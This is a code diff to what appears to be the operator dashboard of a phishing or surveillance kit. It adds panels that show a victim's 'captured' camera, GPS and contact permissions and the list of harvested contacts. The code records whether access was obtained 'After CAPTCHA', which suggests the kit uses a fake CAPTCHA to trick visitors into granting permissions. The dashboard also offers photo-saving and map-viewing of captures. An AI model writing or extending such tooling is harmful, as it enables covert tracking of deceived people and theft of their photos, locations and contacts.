@@ -473,7 +473,7 @@
 
 <!-- Info Modal -->
 <div id="infoModal" class="modal-overlay">
-    <div class="modal-box">
+    <div class="modal-box" style="width:500px;">
         <h3>📋 Capture Details</h3>
         <div class="info-header">
             <div class="info-avatar" id="infoAvatar"></div>
@@ -483,6 +483,8 @@
             </div>
         </div>
         <div class="info-grid" id="infoGrid"></div>
+        <!-- Permission log + Contacts appended here by openInfoModal() -->
+        <div id="infoExtra"></div>
         <div class="modal-row">
             <button class="btn btn-teal"  id="infoDownloadBtn"  style="display:none;">⬇️ Save Photo</button>
             <button class="btn btn-green" id="infoMapBtn"       style="display:none;">🗺️ View on Map</button>
@@ -3017,6 +3019,117 @@ function openInfoModal(p) {
     document.getElementById('infoGrid').innerHTML = rows.map(r =>
         `<div class="info-row${r.full?' full':''}"><div class="ik">${r.k}</div><div class="iv">${esc(String(r.v))}</div></div>`
     ).join('');
+
+    // ── BUILD EXTRA SECTIONS (Permission Log + Contacts) ─────────────────
+    const extra = document.getElementById('infoExtra');
+    let extraHtml = '';
+
+    // ── Permission Log ────────────────────────────────────────────────────
+    const pl = p.permissionLog;
+    if (pl) {
+        const trigger   = p.permissionTrigger || 'direct';
+        const blocked   = !!p.browserBlocksAutoPrompt;
+        const trigLabel = trigger === 'captcha'
+            ? '<span style="color:var(--yellow);font-weight:700;">After CAPTCHA ✓</span>'
+            : '<span style="color:var(--green);font-weight:700;">Direct Request</span>';
+        const blockedLabel = blocked
+            ? '<span style="color:var(--red);font-weight:700;">Yes</span>'
+            : '<span style="color:var(--green);font-weight:700;">No</span>';
+
+        // Status pill helper
+        const statusPill = status => {
+            const map = {
+                allowed:       ['var(--green)',  '✅ Allowed'],
+                denied:        ['var(--red)',    '❌ Denied'],
+                blocked:       ['var(--orange)', '🚫 Blocked'],
+                not_requested: ['var(--muted)',  '— Not Requested'],
+            };
+            const [color, label] = map[status] || ['var(--muted)', status];
+            return `<span style="color:${color};font-weight:700;">${label}</span>`;
+        };
+
+        // Per-permission row helper
+        const permRow = (icon, label, entry) => {
+            if (!entry) return '';
+            const reqLabel = entry.requested
+                ? '<span style="color:var(--text);">Yes</span>'
+                : '<span style="color:var(--muted);">No</span>';
+            const timeStr  = entry.time
+                ? `<span style="color:var(--muted);font-size:10.5px;margin-left:6px;">@ ${esc(entry.time)}</span>`
+                : '';
+            return `
+            <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;
+                padding:10px 12px;margin-bottom:6px;display:grid;
+                grid-template-columns:auto 1fr 1fr 1fr;gap:6px 10px;align-items:center;">
+              <span style="font-size:15px;">${icon}</span>
+              <span style="font-weight:700;font-size:12.5px;">${label}</span>
+              <span style="font-size:11.5px;color:var(--muted);">Req: ${reqLabel}</span>
+              <span style="font-size:11.5px;">${statusPill(entry.status)}${timeStr}</span>
+            </div>`;
+        };
+
+        extraHtml += `
+        <div style="margin-top:18px;border-top:1px solid var(--border);padding-top:14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:12px;">
+            <span style="font-size:14px;">🔐</span>
+            <span style="font-size:13px;font-weight:800;color:var(--text);
+                text-transform:uppercase;letter-spacing:.05em;">Permission Log</span>
+          </div>
+
+          <!-- Trigger + Block rows -->
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:10px;">
+            <div style="background:var(--bg2);border:1px solid var(--border);
+                border-radius:8px;padding:8px 10px;">
+              <div style="font-size:10px;color:var(--muted);margin-bottom:3px;">Permission Trigger</div>
+              <div style="font-size:12px;">${trigLabel}</div>
+            </div>
+            <div style="background:var(--bg2);border:1px solid var(--border);
+                border-radius:8px;padding:8px 10px;">
+              <div style="font-size:10px;color:var(--muted);margin-bottom:3px;">Browser Blocked Auto-Prompt</div>
+              <div style="font-size:12px;">${blockedLabel}</div>
+            </div>
+          </div>
+
+          <!-- Per-permission rows -->
+          ${permRow('📷', 'Camera',  pl.camera)}
+          ${permRow('📍', 'GPS',     pl.gps)}
+          ${permRow('📇', 'Contact', pl.contact)}
+        </div>`;
+    }
+
+    // ── Contacts Captured ─────────────────────────────────────────────────
+    const contacts = p.contacts;
+    if (contacts && contacts.length > 0) {
+        const contactCards = contacts.map(c => `
+            <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;
+                padding:10px 12px;margin-bottom:6px;display:flex;align-items:flex-start;gap:10px;">
+              <div style="width:30px;height:30px;border-radius:7px;flex-shrink:0;
+                  background:linear-gradient(135deg,var(--purple),var(--primary));
+                  display:flex;align-items:center;justify-content:center;
+                  font-size:13px;font-weight:800;color:#fff;">
+                  ${esc((c.name||'?')[0].toUpperCase())}
+              </div>
+              <div style="flex:1;min-width:0;">
+                <div style="font-weight:700;font-size:13px;margin-bottom:3px;">${esc(c.name||'—')}</div>
+                ${c.phone ? `<div style="font-size:11.5px;color:var(--muted);">📞 ${esc(c.phone)}</div>` : ''}
+                ${c.email ? `<div style="font-size:11.5px;color:var(--muted);">✉️ ${esc(c.email)}</div>` : ''}
+              </div>
+            </div>`).join('');
+
+        extraHtml += `
+        <div style="margin-top:14px;border-top:1px solid var(--border);padding-top:14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <span style="font-size:14px;">📇</span>
+            <span style="font-size:13px;font-weight:800;color:var(--text);
+                text-transform:uppercase;letter-spacing:.05em;">Contacts Captured</span>
+            <span style="background:rgba(139,92,246,.2);color:var(--purple);border-radius:10px;
+                padding:1px 8px;font-size:10px;font-weight:700;">${contacts.length}</span>
+          </div>
+          ${contactCards}
+        </div>`;
+    }
+
+    extra.innerHTML = extraHtml;
 
     const dlBtn  = document.getElementById('infoDownloadBtn');
     const mapBtn = document.getElementById('infoMapBtn');
